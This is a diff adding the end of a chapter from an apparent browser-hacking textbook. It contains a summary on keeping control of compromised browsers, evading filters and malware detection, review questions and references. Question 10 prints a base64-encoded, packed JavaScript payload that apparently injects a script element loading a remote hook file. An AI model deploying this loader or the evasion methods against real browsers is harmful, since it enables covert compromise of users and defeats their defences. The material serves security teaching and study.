@@ -1,0 +1,79 @@
+
+The same concept applies while manually de-obfuscating the code, in case the evaluation is done within a browser or other tools that rely on a particular JavaScript engine. The example can be flipped the other way around depending on what filtering solution you want to bypass, but the concept remains the same.
+
+# Summary
+
+In this chapter, you have examined why retaining control is fundamental for browser hacking. The establishment of a communication channel and persisting your control is crucial if you want to be successful when compromising your target.
+
+Various techniques to achieve communication and persistence have been presented, and it’s now up to you to decide which method to use, or perhaps a combination of them, to achieve the best result. One possibility is that when communicating to the browser you might opt for a standard `XMLHttpRequest` communication channel. Then you might get it to automatically upgrade to the WebSocket protocol if supported. Further, you might then achieve persistence by combining `IFrames` and pop-unders. The best option will depend a lot on your specific attacking scenario.
+
+Retaining control of the target browser will give you the opportunity to modularize the different attack code and make real-time decisions. This gives you the option of an attacker’s feedback loop. A particular action may unveil a subsequent issue, which when further investigated may expose more issues. Using this method you can choose which branch of the decision tree to go down as it presents itself. For example, you might identify all active hosts on the target browser’s local network and then choose only these to port scan.
+
+You’ve also examined various techniques to minimize the likelihood your instructions are blocked by filters. Using these methods your code might even be too obscure for simple manual analysis. Of course, this will depend on the sophistication of your obfuscation and the sophistication of your target.
+
+You have explored many techniques that you can use to retain control of your target browser. You are now ready to bend the browser’s functionality against itself. Let’s jump straight into the following chapters that focus on attacking the browser.
+
+# Questions
+
+Level1 **1.** What are the advantages in using a WebSocket protocol instead of an `XMLHttpRequest` channel? **2.** Describe how a DNS-based channel works, and why it’s good to have a stealthy communication. **3.** What is hooking a browser? **4.** Why can Man-in-the-Browser be effective in situations when IFrames cannot be used? **5.** How does the WhiteSpace encoding evasion technique work? **6.** Imagine an environment where you have a network protected by a web filtering solution. Which evasion techniques would you use? How would you combine them? **7.** Why would a time delay evasion technique be effective against Malware detection technologies? **8.** Give an example of hijacking a DOM event. **9.** What is the most reliable persistence technique in your opinion? Would you combine some of the techniques discussed previously? **10.** What does the following encoded string do? You can download the code from [https://browserhacker.com](https://browserhacker.com). 
+
+```
+ZXZhbChmdW5jdGlvbihwLGEsYyxrLGUscil7ZT1mdW5jdGlvbihjKXty
+ZXR1cm4gYy50b1N0cmluZyhhKX07aWYoIScnLnJlcGxhY2UoL14vLFN0
+cmluZykpe3doaWxlKGMtLSlyW2UoYyldPWtbY118fGUoYyk7az1bZnVu
+Y3Rpb24oZSl7cmV0dXJuIHJbZV19XTtlPWZ1bmN0aW9uKCl7cmV0dXJu
+J1xcdysnfTtjPTF9O3doaWxlKGMtLSlpZihrW2NdKXA9cC5yZXBsYWNl
+KG5ldyBSZWdFeHAoJ1xcYicrZShjKSsnXFxiJywnZycpLGtbY10pO3Jl
+dHVybiBwfSgnZiAzKGEpe2k9XCdcXHZcJz09XCd2XCc7OCghaSl7Mi5o
+KFwnNlwnKVswXS43KGEpfX07cz0yW1wnOVwnK1wnYlwnK1wnY1wnW1wn
+ZFwnXSgvZS8sXCc1XCcpXShcJ2dcJyk7ND0iai5rL2wiKyI6MS5tLm4u
+byIrIi8vOnAiOzQucSgiIikucigpLnQoIiIpO3MudT13KHgoInk9PSIp
+KTszKHMpOycsMzUsMzUsJ3x8ZG9jdW1lbnR8eGlydU1ESnxuZGh5c3xF
+bGVtfGhlYWR8YXBwZW5kQ2hpbGR8aWZ8Y3J8fGVhdGV8NDIzNDIzc2Rm
+d2VlbnRlbnR8cmVwbGFjZXw0MjM0MjNzZGZ3ZWVudHxmdW5jdGlvbnxz
+Y3JpcHR8Z2V0RWxlbWVudHNCeVRhZ05hbWV8fHNqfGtvb2h8MDAwM3w3
+Nnw2MXwyNzF8cHR0aHxzcGxpdHxyZXZlcnNlfHxqb2lufHNyY3x8ZXZh
+bHxhdG9ifEluTbnFMbXR2YjJndk1EQXdNem94TGpjMkxqWXhMakkzTVM4
+dk9uQjBkR2dpTG5Od2JHbDBLQ0lpS1ZzbmNtVjJKeXNuWVdGaFlXRW5X
+eWR5WlhCc1lXTmxKMTBvTDJGaFlXRmhMeXduWlhKelpTY3BYU2dwV3lk
+cWIybHVKMTBvSWlJcE93Jy5zcGxpdCgnfCcpLDAse30pKQ==
+```
+
+/Level1
+
+For answers to the questions please refer to the book’s website at [https://browserhacker.com/answers](https://browserhacker.com/answers) or the Wiley website at: [www.wiley.com/go/browserhackershandbook](http://www.wiley.com/go/browserhackershandbook).
+
+**Notes**
+
+1\. Mayhem. (2001). IA32 Advanced Function Hooking. Retrieved March 8, 2013 from [http://www.phrack.org/issues.html?issue=58&id=8#article](http://www.phrack.org/issues.html?issue=58&id=8#article)
+
+2\. Caniuse.com. (2013). WebRTC. Retrieved March 8, 2013 from [http://caniuse.com/#search=webrtc](http://caniuse.com/#search=webrtc)
+
+3\. Mozilla. (2013). Closures. Retrieved March 8, 2013 from [https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Closures](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Closures)
+
+4\. Eric Law. (2010). XDomainRequest - Restrictions, Limitations and Workarounds. Retrieved March 8, 2013 from [http://blogs.msdn.com/b/ieinternals/archive/2010/05/13/xdomainrequest-restrictions-limitations-and-workarounds.aspx](http://blogs.msdn.com/b/ieinternals/archive/2010/05/13/xdomainrequest-restrictions-limitations-and-workarounds.aspx)
+
+5\. Alex Russel. (2006). Comet: Low Latency Data for the Browser. Retrieved March 8, 2013 from [http://infrequently.org/2006/03/comet-low-latency-data-for-the-browser/](http://infrequently.org/2006/03/comet-low-latency-data-for-the-browser/)
+
+6\. Socket.io. (2012). Socket.io. Retrieved March 8, 2013 from [http://socket.io/#browser-support](http://socket.io/#browser-support)
+
+7\. Ilya Grogorik. (2009). EventMachine based WebSocket server. Retrieved March 8, 2013 from [https://github.com/igrigorik/em-websocket](https://github.com/igrigorik/em-websocket)
+
+8\. EventMachine Team. (2008). EventMachine. Retrieved March 8, 2013 from [https://github.com/eventmachine/eventmachine/wiki](https://github.com/eventmachine/eventmachine/wiki)
+
+9\. Opera. (2012). An Introduction to HTML5 web messaging. Retrieved March 8, 2013 from [http://dev.opera.com/articles/view/window-postmessage-messagechannel/](http://dev.opera.com/articles/view/window-postmessage-messagechannel/)
+
+10\. I. Fette and A. Melkinov. (2011). The Websocket Protocol. Retrieved March 8, 2013 from [http://tools.ietf.org/html/rfc6455#section-11.2](http://tools.ietf.org/html/rfc6455#section-11.2)
+
+11\. Securitywire. (2010). Iodine rules. Retrieved March 8, 2013 from [http://www.securitywire.com/snort_rules/iodine.rules](http://www.securitywire.com/snort_rules/iodine.rules)
+
+12\. Kenton Born. (2010). Browser-based Covert Data Exfiltration. Retrieved March 8, 2013 from [http://arxiv.org/pdf/1004.4357.pdf](http://arxiv.org/pdf/1004.4357.pdf)
+
+13\. Mozilla. (2013). Manipulating the browser history. Retrieved March 8, 2013 from [https://developer.mozilla.org/en-US/docs/Web/Guide/API/DOM/Manipulating_the_browser_history](https://developer.mozilla.org/en-US/docs/Web/Guide/API/DOM/Manipulating_the_browser_history)
+
+14\. Hans-Peter Buniat. (2012). jQuery pop-under. Retrieved March 8, 2013 from [https://github.com/hpbuniat/jquery-popunder](https://github.com/hpbuniat/jquery-popunder)
+
+15\. IOActive. (2012). Reversal and Analysis of Zeus and SpyEye Banking Trojans. Retrieved March 8, 2013 from [http://www.ioactive.com/pdfs/ZeusSpyEyeBankingTrojanAnalysis.pdf](http://www.ioactive.com/pdfs/ZeusSpyEyeBankingTrojanAnalysis.pdf)
+
+16\. Mozilla. (2013). EventTarget. Retrieved March 8, 2013 from [https://developer.mozilla.org/en-US/docs/Web/API/EventTarget.addEventListener](https://developer.mozilla.org/en-US/docs/Web/API/EventTarget.addEventListener)
+
